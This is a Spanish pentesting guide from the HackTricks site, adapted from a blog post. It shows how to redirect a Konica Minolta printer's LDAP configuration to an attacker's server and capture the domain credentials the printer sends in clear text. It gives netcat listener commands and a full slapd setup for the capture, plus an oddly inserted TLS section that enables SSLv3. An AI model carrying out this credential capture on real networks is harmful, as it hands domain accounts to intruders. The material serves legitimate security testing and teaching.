Hay varios blogs en Internet que resaltan los peligros de dejar las impresoras configuradas con LDAP con credenciales de inicio de sesión predeterminadas o débiles. Esto se debe a que un atacante podría engañar a la impresora para que se autentique contra un servidor LDAP falso (normalmente un `nc -vv -l -p 444` es suficiente) y capturar las credenciales de la impresora en texto claro.

Además, varias impresoras contendrán registros con nombres de usuario o incluso podrían ser capaces de descargar todos los nombres de usuario del Controlador de Dominio.

Toda esta información sensible y la falta común de seguridad hace que las impresoras sean muy interesantes para los atacantes.

Algunos blogs sobre el tema:

* [https://www.ceos3c.com/hacking/obtaining-domain-credentials-printer-netcat/](https://www.ceos3c.com/hacking/obtaining-domain-credentials-printer-netcat/)
* [https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)

**La siguiente información fue copiada de** [**https://grimhacker.com/2018/03/09/just-a-printer/**](https://grimhacker.com/2018/03/09/just-a-printer/)

# Configuración de LDAP

En las impresoras Konica Minolta es posible configurar un servidor LDAP al que conectarse, junto con credenciales. En versiones anteriores del firmware de estos dispositivos, he oído que es posible recuperar las credenciales simplemente leyendo el código HTML de la página. Ahora, sin embargo, las credenciales no se devuelven en la interfaz, por lo que tenemos que trabajar un poco más.

La lista de servidores LDAP se encuentra en: Red > Configuración LDAP > Configuración de LDAP

La interfaz permite modificar el servidor LDAP sin volver a introducir las credenciales que se utilizarán para conectarse. Supongo que esto es para una experiencia de usuario más sencilla, pero da la oportunidad a un atacante de escalar desde el maestro de una impresora hasta un punto de apoyo en el dominio.

Podemos reconfigurar la dirección del servidor LDAP a una máquina que controlemos y desencadenar una conexión con la útil funcionalidad "Probar conexión".

# Escuchando los datos

## netcat

Si tienes más suerte que yo, es posible que puedas salirte con la tuya con un simple oyente de netcat:
```
sudo nc -k -v -l -p 386
```
Me asegura [@\_castleinthesky](https://twitter.com/\_castleinthesky) que esto funciona la mayoría de las veces, sin embargo, aún no he tenido tanta suerte.

## Slapd

He descubierto que se requiere un servidor LDAP completo ya que la impresora primero intenta una conexión nula y luego consulta la información disponible, solo si estas operaciones tienen éxito procede a conectarse con las credenciales.

Busqué un servidor LDAP simple que cumpliera con los requisitos, sin embargo, parecía haber opciones limitadas. Al final, opté por configurar un servidor LDAP abierto y usar el servicio de servidor de depuración slapd para aceptar conexiones e imprimir los mensajes de la impresora. (Si conoces una alternativa más fácil, estaría encantado de saberlo)

### Instalación

(Tenga en cuenta que esta sección es una versión ligeramente adaptada de la guía aquí [https://www.server-world.info/en/note?os=Fedora\_26\&p=openldap](https://www.server-world.info/en/note?os=Fedora\_26\&p=openldap) )

Desde una terminal de root:

**Instalar OpenLDAP,**
```
#> dnf install -y install openldap-servers openldap-clients

#> cp /usr/share/openldap-servers/DB_CONFIG.example /var/lib/ldap/DB_CONFIG 

#> chown ldap. /var/lib/ldap/DB_CONFIG
```
**Establecer una contraseña de administrador de OpenLDAP (la necesitará de nuevo en breve)**
```
#> slappasswd 
New password:
Re-enter new password:
{SSHA}xxxxxxxxxxxxxxxxxxxxxxxx
```

```
#> vim chrootpw.ldif
# specify the password generated above for "olcRootPW" section
dn: olcDatabase={0}config,cn=config
changetype: modify
add: olcRootPW
olcRootPW: {SSHA}xxxxxxxxxxxxxxxxxxxxxxxx
```

```
#> ldapadd -Y EXTERNAL -H ldapi:/// -f chrootpw.ldif
SASL/EXTERNAL authentication started
SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth
SASL SSF: 0
modifying entry "olcDatabase={0}config,cn=config"
```
**Importar Esquemas Básicos**
```
#> ldapadd -Y EXTERNAL -H ldapi:/// -f /etc/openldap/schema/cosine.ldif 
SASL/EXTERNAL authentication started
SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth
SASL SSF: 0
adding new entry "cn=cosine,cn=schema,cn=config"

#> ldapadd -Y EXTERNAL -H ldapi:/// -f /etc/openldap/schema/nis.ldif 
SASL/EXTERNAL authentication started
SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth
SASL SSF: 0
adding new entry "cn=nis,cn=schema,cn=config"

#> ldapadd -Y EXTERNAL -H ldapi:/// -f /etc/openldap/schema/inetorgperson.ldif 
SASL/EXTERNAL authentication started
SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth
SASL SSF: 0
adding new entry "cn=inetorgperson,cn=schema,cn=config"
```
**Establecer el nombre de su dominio en la base de datos LDAP.**
```
# generate directory manager's password
#> slappasswd 
New password:
Re-enter new password:
{SSHA}xxxxxxxxxxxxxxxxxxxxxxxx

#> vim chdomain.ldif
# specify the password generated above for "olcRootPW" section
dn: olcDatabase={1}monitor,cn=config
changetype: modify
replace: olcAccess
olcAccess: {0}to * by dn.base="gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth"
read by dn.base="cn=Manager,dc=foo,dc=bar" read by * none

dn: olcDatabase={2}mdb,cn=config
changetype: modify
replace: olcSuffix
olcSuffix: dc=foo,dc=bar

dn: olcDatabase={2}mdb,cn=config
changetype: modify
replace: olcRootDN
olcRootDN: cn=Manager,dc=foo,dc=bar

dn: olcDatabase={2}mdb,cn=config
changetype: modify
add: olcRootPW
olcRootPW: {SSHA}xxxxxxxxxxxxxxxxxxxxxxxx

dn: olcDatabase={2}mdb,cn=config
changetype: modify
add: olcAccess
olcAccess: {0}to attrs=userPassword,shadowLastChange by
dn="cn=Manager,dc=foo,dc=bar" write by anonymous auth by self write by * none
olcAccess: {1}to dn.base="" by * read
olcAccess: {2}to * by dn="cn=Manager,dc=foo,dc=bar" write by * read

#> ldapmodify -Y EXTERNAL -H ldapi:/// -f chdomain.ldif 
SASL/EXTERNAL authentication started
SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth
SASL SSF: 0
modifying entry "olcDatabase={1}monitor,cn=config"

modifying entry "olcDatabase={2}mdb,cn=config"

modifying entry "olcDatabase={2}mdb,cn=config"

modifying entry "olcDatabase={2}mdb,cn=config"

modifying entry "olcDatabase={2}mdb,cn=config"

#> vim basedomain.ldif
dn: dc=foo,dc=bar
objectClass: top
objectClass: dcObject
objectclass: organization
o: Foo Bar
dc: DC1

dn: cn=Manager,dc=foo,dc=bar
objectClass: organizationalRole
cn: Manager
description: Directory Manager

dn: ou=People,dc=foo,dc=bar
objectClass: organizationalUnit
ou: People

dn: ou=Group,dc=foo,dc=bar
objectClass: organizationalUnit
ou: Group

#> ldapadd -x -D cn=Manager,dc=foo,dc=bar -W -f basedomain.ldif 
Enter LDAP Password: # directory manager's password
adding new entry "dc=foo,dc=bar"

adding new entry "cn=Manager,dc=foo,dc=bar"

adding new entry "ou=People,dc=foo,dc=bar"

adding new entry "ou=Group,dc=foo,dc=bar"
```
**Configurar LDAP TLS**

**Crear un certificado SSL**
```
#> cd /etc/pki/tls/certs 
#> make server.key 
umask 77 ; \
/usr/bin/openssl genrsa -aes128 2048 > server.key
Generating RSA private key, 2048 bit long modulus
...
...
e is 65537 (0x10001)
Enter pass phrase: # set passphrase
Verifying - Enter pass phrase: # confirm

# remove passphrase from private key
#> openssl rsa -in server.key -out server.key 
Enter pass phrase for server.key: # input passphrase
writing RSA key

#> make server.csr 
umask 77 ; \
/usr/bin/openssl req -utf8 -new -key server.key -out server.csr
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [XX]: # country
State or Province Name (full name) []: # state
Locality Name (eg, city) [Default City]: # city
Organization Name (eg, company) [Default Company Ltd]: # company
Organizational Unit Name (eg, section) []:Foo Bar # department
Common Name (eg, your name or your server's hostname) []:www.foo.bar # server's FQDN
Email Address []:xxx@foo.bar # admin email
Please enter the following 'extra' attributes
to be sent with your certificate request
A challenge password []: # Enter
An optional company name []: # Enter

#> openssl x509 -in server.csr -out server.crt -req -signkey server.key -days 3650
Signature ok
subject=/C=/ST=/L=/O=/OU=Foo Bar/CN=dlp.foo.bar/emailAddress=xxx@roo.bar
Getting Private key
```
**Configurar Slapd para SSL/TLS**

Para asegurar la comunicación entre el cliente y el servidor LDAP, es recomendable configurar Slapd para usar SSL/TLS. Esto se puede hacer generando un certificado autofirmado o utilizando un certificado firmado por una autoridad de certificación.

Para generar un certificado autofirmado, se puede utilizar la herramienta OpenSSL. Primero, se debe generar una clave privada y un certificado autofirmado:

```
openssl req -newkey rsa:2048 -nodes -keyout server.key -x509 -days 365 -out server.crt
```

Luego, se deben configurar los parámetros de seguridad en el archivo slapd.conf:

```
TLSCipherSuite HIGH:MEDIUM:+SSLv3
TLSCertificateFile /path/to/server.crt
TLSCertificateKeyFile /path/to/server.key
```

Finalmente, se debe reiniciar el servicio Slapd para que los cambios surtan efecto:

```
service slapd restart
```

Una vez configurado SSL/TLS, se puede verificar que la conexión está cifrada utilizando la herramienta ldapsearch con la opción -Z:

```
ldapsearch -x -H ldaps://localhost -b "dc=example,dc=com" -D "cn=admin,dc=example,dc=com" -w password -Z
```
```
#> cp /etc/pki/tls/certs/server.key \
/etc/pki/tls/certs/server.crt \
/etc/pki/tls/certs/ca-bundle.crt \
/etc/openldap/certs/

#> chown ldap. /etc/openldap/certs/server.key \
/etc/openldap/certs/server.crt \
/etc/openldap/certs/ca-bundle.crt

#> vim mod_ssl.ldif
# create new
 dn: cn=config
changetype: modify
add: olcTLSCACertificateFile
olcTLSCACertificateFile: /etc/openldap/certs/ca-bundle.crt
-
replace: olcTLSCertificateFile
olcTLSCertificateFile: /etc/openldap/certs/server.crt
-
replace: olcTLSCertificateKeyFile
olcTLSCertificateKeyFile: /etc/openldap/certs/server.key

#> ldapmodify -Y EXTERNAL -H ldapi:/// -f mod_ssl.ldif 
SASL/EXTERNAL authentication started
SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth
SASL SSF: 0
modifying entry "cn=config"
```
**Permitir LDAP a través del firewall local**
```
firewall-cmd --add-service={ldap,ldaps}
```
## La recompensa

Una vez que haya instalado y configurado su servicio LDAP, puede ejecutarlo con el siguiente comando:

> ```
> slapd -d 2
> ```

La captura de pantalla a continuación muestra un ejemplo de la salida cuando ejecutamos la prueba de conexión en la impresora. Como puede ver, el nombre de usuario y la contraseña se pasan del cliente LDAP al servidor.

![slapd terminal output containing the username "MyUser" and password "MyPassword"](https://i1.wp.com/grimhacker.com/wp-content/uploads/2018/03/slapd\_output.png?resize=474%2C163\&ssl=1)

# ¿Qué tan malo puede ser?

Esto depende mucho de las credenciales que se hayan configurado.

Si se sigue el principio de menor privilegio, es posible que solo obtenga acceso de lectura a ciertos elementos del directorio activo. Esto a menudo sigue siendo valioso, ya que puede utilizar esa información para formular ataques más precisos.

Por lo general, es probable que obtenga una cuenta en el grupo de usuarios de dominio que puede dar acceso a información confidencial o formar la autenticación previa necesaria para otros ataques.

O, como en mi caso, puede ser recompensado por configurar un servidor LDAP y recibir una cuenta de administrador de dominio en bandeja de plata.


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- ¿Trabaja en una **empresa de ciberseguridad**? ¿Quiere ver su **empresa anunciada en HackTricks**? ¿O quiere tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulte los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!

- Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFT**](https://opensea.io/collection/the-peass-family)

- Obtenga el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)

- **Únase al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígame** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Comparta sus trucos de hacking enviando PR al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
